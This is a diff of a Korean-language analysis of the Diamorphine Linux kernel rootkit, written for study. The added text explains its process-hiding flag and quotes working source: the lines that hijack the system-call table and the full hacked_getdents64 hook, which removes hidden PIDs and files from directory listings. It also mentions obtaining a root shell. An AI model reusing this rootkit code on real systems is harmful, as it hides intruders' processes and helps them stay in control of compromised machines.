@@ -254,13 +254,97 @@ SIGINVIS 시그널을 받은경우에는 우선 해당 프로세스의 pid 가 �
 전체 프로세스를 돌아보면서 만약 없다면 -ESRCH ( /* No such process */ ) 에로코드를 반환한다.  
 
 그게 아니라면 PF_INVISIBLE 값으로 플래그를 수정한다.   
-PF_INVISIBLE 은 diamorphine.h 에 정의되어 있고 프로세스 숨김 용도로 쓰기 위해 만든 플래그이다.  
-당연히 기존 커널에는 없고 flags 
+PF_INVISIBLE 은 diamorphine.h 에 정의되어 있고 프로세스 숨김 용도로 쓰기 위해 만든 플래그이다.    
 
-~  
-~  
+당연히 기존 커널에는 없고 여기서는 find_task 로 읽어온 task_struct 의 PF_INVISIBLE 플래그를 ^= 연산으로 xor 연산한다.      
 
-분석 후 내용 추가 필요
+
+```
+#define __NR_getdents 141
+.
+.
+.
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
+	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
+#else
+	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
+	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+```
+orig_getdents64 에 시스템 콜 141 번에 해당하는 getdents 시스템 콜을 호출하여, 열려있는 디렉토리에 대해 모든 엔트리를 읽어와준다.  
+
+그리고 그렇게 읽어온 정보들을 hacked_getdents64 에서 PF_INVISIBLE 플래그를 확인해가며 1이면 버퍼에서 제거해버린다. 아래는 hacked_getdents64 함수이다.  
+
+
+
+```
+hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
+	unsigned int count)
+{
+	int ret = orig_getdents64(fd, dirent, count), err;
+#endif
+	unsigned short proc = 0;
+	unsigned long off = 0;
+	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+	struct inode *d_inode;
+
+	if (ret <= 0)
+		return ret;
+
+	kdirent = kzalloc(ret, GFP_KERNEL);
+	if (kdirent == NULL)
+		return ret;
+
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+		/*&& MINOR(d_inode->i_rdev) == 1*/)
+		proc = 1;
+
+	while (off < ret) {
+		dir = (void *)kdirent + off;
+		if ((!proc &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
+		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+			if (dir == kdirent) {
+				ret -= dir->d_reclen;
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				continue;
+			}
+			prev->d_reclen += dir->d_reclen;
+		} else
+			prev = dir;
+		off += dir->d_reclen;
+	}
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
+	kfree(kdirent);
+	return ret;
+}
+
+```
+hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)  
+이 함수는 인자로 fd 와 dirent, count 를 가져가는데, 여기서 dirent 는 유저 공간에 있는 엔트리 버퍼의 주소를 가리키는 포인터이다.   
+
+이 dirent 값을 변경하기 위해서 kdirent 에 dirent 를 복사하고 kdirent 를 수정한 뒤 `copy_to_user(dirent, kdirent, modified_ret);` 로 dirent 값을 다시 바꾼다.  
+
+값이 바뀌는 기준은, `is_invisible(pid)==1` 으로 플래그를 확인하고, 1이라면 해당 PID 를 버퍼에서 제거해버린다.   
+
+ps 명령어는 정리된 엔트리만 받아보므로 버퍼에서 지워진 PID 는 완전히 숨겨질 수 있다.  
+
+
 
 <br>
 
@@ -271,3 +355,4 @@ PF_INVISIBLE 은 diamorphine.h 에 정의되어 있고 프로세스 숨김 용�
 - root 쉘 획득
 
 <img width="937" height="242" alt="image" src="https://github.com/user-attachments/assets/01b7da57-bea4-486a-9cc7-5df5d338213a" />
+
